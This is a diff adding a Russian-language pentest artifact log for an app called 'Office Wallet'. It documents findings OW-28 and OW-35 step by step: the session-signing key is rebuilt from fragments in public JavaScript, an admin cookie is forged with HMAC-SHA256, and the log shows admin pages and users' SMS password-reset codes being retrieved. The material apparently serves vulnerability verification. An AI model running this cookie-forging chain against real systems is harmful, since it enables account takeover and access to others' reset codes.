@@ -1,0 +1,45 @@
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-35
+################################################################################################
+--- проверка 1/2 ---
+== 2. OW-28/OW-35: фейк админ-куки: роль в подписи, ключ в статике ==
+    · При входе сервер собирает куку ow.<uid>.<роль>.<HMAC-SHA256(SESSION_KEY, uid:роль>).
+    · Роль входит в подписываемую строку, но после проверки подписи с базой не сверяется
+    · (auth.go:40-43). Сам SESSION_KEY — константа, её отдаёт статика приложения,
+    · поэтому подпись считаем сами и подставляем себе роль admin. Пароль не нужен.
+    → SQL SELECT id FROM users WHERE login='adminw'
+    ← psql 6
+    HMAC-SHA256(office-wallet-session-key, '6:admin') = c59d80997f788119de7c...
+    → GET /admin/secrets  Cookie: ow_session=ow.6.admin.<hmac>
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Служебное · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"...
+    ┌─ АРТЕФАКТ · OW-28/OW-35 · поддельная админ-сессия
+    │ подписанное значение: ow.6.admin.<HMAC>
+    │ GET /admin/secrets → HTTP 200; в ответе найден заголовок админки
+    └─
+[+] админка открыта без пароля
+    · Та же кука открывает SMS-шлюз — там коды сброса паролей всех пользователей
+    · (админская страница, handlers_auth.go:158-179).
+    → GET /gateway/sms  (коды сброса паролей всех пользователей)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>SMS-шлюз · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">...
+    код подтверждения сброса 144105
+    код подтверждения сброса 486357
+    код подтверждения сброса 914206
+    ┌─ АРТЕФАКТ · OW-28 · SMS-коды доступны под поддельной ролью
+    │ GET /gateway/sms → HTTP 200; извлечено строк кодов: 3
+    └─
+
+--- проверка 2/2 ---
+== OW-35 · секрет подписи сессии извлекается из публичной статики ==
+    → GET /static/wallet.js
+    ← HTTP 200 /* Office Wallet client */ window.OfficeWallet = {   keyParts: ["office", "-", "wallet"],   tipLimitRub: 50,   sessionKey() {     const tail = window.__SK_TAIL__ || "";     return this.keyParts.join("") + tail;   },   formatRub(kop) {     c...
+    → GET /static/legacy-sync.js
+    ← HTTP 200 /* Legacy supply sync helpers */ (function () {   window.SupplySync = {     pathParts: ["api", "v2", "supply", "pricing"],     endpoint() {       return "/" + this.pathParts.join("/");     },     async resolveChannel() {       const r = awa...
+    → GET /admin/secrets с OW-35 HMAC
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Служебное · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"...
+    ┌─ АРТЕФАКТ · OW-35 · публичная статика раскрыла ключ подписи
+    │ GET /static/wallet.js → HTTP 200; keyParts="office", "-", "wallet"
+    │ GET /static/legacy-sync.js → HTTP 200; tail="-", "session", "-", "key"
+    │ собран SESSION_KEY=office-wallet-session-key; поддельная admin cookie → HTTP 200
+    └─
+[+] секрет из публичных JS позволяет подписать admin cookie
